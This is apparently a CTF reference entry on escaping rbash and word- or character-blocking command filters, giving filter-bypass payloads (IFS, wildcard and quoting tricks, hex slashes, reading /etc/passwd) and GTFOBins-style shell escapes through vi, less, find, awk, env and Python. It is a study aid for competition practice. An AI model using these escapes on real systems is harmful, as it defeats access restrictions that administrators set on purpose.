---
id: bash-restricted-shell-escape
category: JAIL
tags: [jail, rbash, restricted-shell, shell-escape, gtfobins, filter-bypass, ifs, env, wildcard, builtins, bash]
tools: []
manuals: []
title: "Restricted shell — escaping rbash / a command filter"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: [python-sandbox-escape]
---

## How to recognize this pattern

- You have a shell, but a limited one: `rbash` (restricted bash), a menu that accepts only certain
  commands, or a filter that blocks words/characters (`/`, space, `cat`, `sh`).
- rbash symptoms: no `cd`, no `/` in a command, no redirection (`>`), no setting `PATH`.

## Method

### 1. Characters/space filtered
```bash
cat${IFS}/flag.txt          cat</flag.txt          {cat,/flag.txt}        # space
/bin/c?t /fl?g.txt          /bin/c''at /fla*       # wildcard/quote for a blocked word
echo /fl*                   # globbing reveals names without typing them
$'\x2f'etc$'\x2f'passwd      # slash via \x2f if '/' is blocked
```

### 2. Break out of rbash (drop to a normal bash)
If some allowed binary has a shell escape, use **GTFOBins**:
```bash
vi               # inside: :!/bin/bash   or  :set shell=/bin/bash | :shell
less /etc/passwd # inside: !/bin/bash
find . -exec /bin/bash \; -quit
awk 'BEGIN{system("/bin/bash")}'
env /bin/bash    env -i bash --noprofile --norc
python3 -c 'import os;os.system("/bin/bash")'
# invoke bash with no restriction another way:
bash --noprofile --norc ; ssh localhost -t bash
```

### 3. Set PATH/variables if the environment allows it
```bash
export PATH=/bin:/usr/bin     # if export isn't blocked
BASH_ENV='/bin/sh' bash -c ... # BASH_ENV runs a script before the command (if not sanitized)
```

## Gotchas

- In rbash, `PATH` is usually read-only and `/` forbidden in command names — that's why the trick is to
  **enter an allowed program that spawns a shell** (GTFOBins), not to fight the filter.
- If you only need to **read the flag** (not a full shell), often `less`/`more`/`ed`/`cat` of an
  absolute path is enough — try that before escaping.
- A word-blacklist filter falls to concatenation/quoting (`c""at`), variables (`${PATH:0:1}` gives
  `/`), or an equivalent binary (`tac`, `head`, `nl`, `xxd`, `od`).
- Distinguish this from **pyjail** (Python) — there the escape goes through `__builtins__`/`__subclasses__`,
  not GTFOBins.

## Cross-reference

- `python-sandbox-escape` — when the jail is a Python interpreter, not a shell.
- GTFOBins (gtfobins.github.io) — have it offline beforehand: escapes via an allowed binary.
